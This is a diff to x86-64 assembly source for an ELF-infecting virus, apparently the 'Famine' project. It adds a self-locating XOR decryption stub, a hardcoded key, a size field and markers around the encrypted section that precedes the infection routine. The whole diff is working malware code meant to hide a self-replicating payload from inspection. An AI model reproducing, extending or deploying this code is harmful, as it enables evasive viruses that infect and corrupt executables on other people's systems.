@@ -41,6 +41,96 @@ global list_files_recursive
 ; ============================================
 
 virus_start:
+; ============================================
+; DECRYPTION STUB - This code decrypts the encrypted virus payload
+; This stub is NOT encrypted and runs first
+; ============================================
+decrypt_stub_start:
+    ; Get our current position using call/pop trick
+    call .get_decrypt_base
+.get_decrypt_base:
+    pop rax                         ; rax = address of this instruction
+    
+    ; Calculate address of encrypted_size field
+    ; encrypted_size is after the entire stub, at a fixed offset
+    mov r11, rax
+    sub r11, .get_decrypt_base - xor_key
+    add r11, 16                     ; Skip xor_key to get to encrypted_size
+    
+    ; Check if we need to decrypt (encrypted_size != 0)
+    mov rcx, [r11]
+    test rcx, rcx
+    jz .skip_decrypt                ; If size is 0, skip decryption
+    
+    ; Save registers we'll modify during decryption
+    push rbx
+    push rdx
+    push rsi
+    push rdi
+    
+    ; Calculate address of XOR key
+    mov rdi, rax
+    sub rdi, .get_decrypt_base - xor_key  ; rdi = address of xor_key
+    
+    ; Calculate address of encrypted data (after encrypted_size)
+    mov rsi, r11
+    add rsi, 8                      ; Skip the size field, now rsi points to encrypted data
+    
+    ; rcx already has the size
+    ; Initialize key index: rbx = 0
+    xor rbx, rbx
+    
+.decrypt_loop:
+    ; Load encrypted byte
+    mov al, [rsi]
+    
+    ; Load key byte
+    mov dl, [rdi + rbx]
+    
+    ; XOR decrypt
+    xor al, dl
+    
+    ; Store decrypted byte
+    mov [rsi], al
+    
+    ; Advance data pointer
+    inc rsi
+    
+    ; Advance and wrap key index
+    inc rbx
+    cmp rbx, XOR_KEY_LENGTH         ; Key length
+    jl .no_key_reset
+    xor rbx, rbx                    ; Reset key index to 0
+.no_key_reset:
+    
+    ; Decrement counter and loop
+    dec rcx
+    jnz .decrypt_loop
+    
+    ; Restore registers
+    pop rdi
+    pop rsi
+    pop rdx
+    pop rbx
+    
+.skip_decrypt:
+    ; Jump over the data section to _start
+    jmp _start
+
+; XOR key (16 bytes) - will be randomly generated during build
+xor_key:
+    db 0x13, 0x37, 0xDE, 0xAD, 0xBE, 0xEF, 0xCA, 0xFE
+    db 0xBA, 0xBE, 0xF0, 0x0D, 0xC0, 0xDE, 0xFA, 0xCE
+
+; Size of encrypted data (8 bytes) - will be set during build
+; If this is 0, no decryption is performed (e.g., original Famine binary)
+encrypted_size:
+    dq 0
+
+; ENCRYPTED SECTION START MARKER
+; Everything from here to encrypt_section_end will be encrypted
+encrypt_section_start:
+
 ; Original entry point storage (patched during infection)
 original_entry_storage:
     dq 0                        ; 8 bytes for original entry point
@@ -1098,6 +1188,11 @@ virus_infect_elf:
     mov rsp, rbp
     pop rbp
     ret
+
+; ============================================
+; ENCRYPTED SECTION END MARKER
+; ============================================
+encrypt_section_end:
 
 ; ============================================
 ; VIRUS CODE END
